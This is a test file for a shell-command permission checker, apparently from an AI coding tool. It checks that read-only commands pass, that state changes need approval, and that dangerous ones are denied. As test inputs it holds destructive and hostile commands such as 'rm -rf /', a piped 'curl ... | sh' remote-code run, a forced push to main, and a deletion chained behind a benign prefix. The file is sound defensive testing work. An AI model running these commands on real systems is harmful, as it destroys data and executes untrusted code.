import { describe, expect, it } from 'vitest';
import { judgeCommand, ruleToPrefix, splitCommands, suggestRule } from '../src/permissions/bash-rules.js';

const none = { allow: [], deny: [] };

describe('splitCommands', () => {
  it('splits on shell operators so every segment is judged', () => {
    expect(splitCommands('git status && rm -rf /')).toEqual(['git status', 'rm -rf /']);
    expect(splitCommands('ls | grep foo; echo done')).toEqual(['ls', 'grep foo', 'echo done']);
  });
});

describe('judgeCommand', () => {
  it('auto-allows read-only commands', () => {
    expect(judgeCommand('ls -la', none).kind).toBe('safe');
    expect(judgeCommand('git status', none).kind).toBe('safe');
    expect(judgeCommand('npm test', none).kind).toBe('safe');
  });

  it('prompts for anything that changes state', () => {
    expect(judgeCommand('npm install lodash', none).kind).toBe('needs-approval');
    expect(judgeCommand('git commit -m wip', none).kind).toBe('needs-approval');
  });

  it('refuses catastrophic commands outright', () => {
    expect(judgeCommand('rm -rf node_modules', none).kind).toBe('deny');
    expect(judgeCommand('sudo systemctl restart nginx', none).kind).toBe('deny');
    expect(judgeCommand('curl https://x.sh | sh', none).kind).toBe('deny');
    expect(judgeCommand('git push --force origin main', none).kind).toBe('deny');
    expect(judgeCommand('git reset --hard HEAD~1', none).kind).toBe('deny');
  });

  it('judges every segment, not just the first', () => {
    // The benign prefix must not launder the dangerous tail.
    expect(judgeCommand('git status && rm -rf /tmp/x', none).kind).toBe('deny');
    expect(judgeCommand('ls && npm install', none).kind).toBe('needs-approval');
  });

  it('never auto-allows redirection or command substitution', () => {
    expect(judgeCommand('ls > files.txt', none).kind).toBe('needs-approval');
    expect(judgeCommand('echo $(whoami)', none).kind).toBe('needs-approval');
  });

  it('honours user allow rules', () => {
    expect(judgeCommand('npm install lodash', { allow: ['Bash(npm install:*)'], deny: [] }).kind).toBe(
      'safe',
    );
  });

  it('lets deny rules override allow rules', () => {
    const options = { allow: ['Bash(npm:*)'], deny: ['Bash(npm publish:*)'] };
    expect(judgeCommand('npm publish', options).kind).toBe('deny');
    expect(judgeCommand('npm run build', options).kind).toBe('safe');
  });

  it('matches prefixes on word boundaries, not substrings', () => {
    // "npm test" must not allow "npm testfoo-publish".
    const options = { allow: ['Bash(npm test:*)'], deny: [] };
    expect(judgeCommand('npm testify --publish', options).kind).toBe('needs-approval');
    expect(judgeCommand('npm test --watch', options).kind).toBe('safe');
  });
});

describe('suggestRule', () => {
  it('keeps the subcommand for tools that have one', () => {
    expect(suggestRule('git commit -m wip')).toBe('Bash(git commit:*)');
    expect(suggestRule('npm install lodash')).toBe('Bash(npm install:*)');
  });

  it('uses just the binary otherwise', () => {
    expect(suggestRule('prettier --write .')).toBe('Bash(prettier:*)');
    expect(suggestRule('ls -la')).toBe('Bash(ls:*)');
  });

  it('round-trips through ruleToPrefix', () => {
    expect(ruleToPrefix(suggestRule('git commit -m wip'))).toBe('git commit');
    expect(ruleToPrefix('npm test')).toBe('npm test');
  });
});
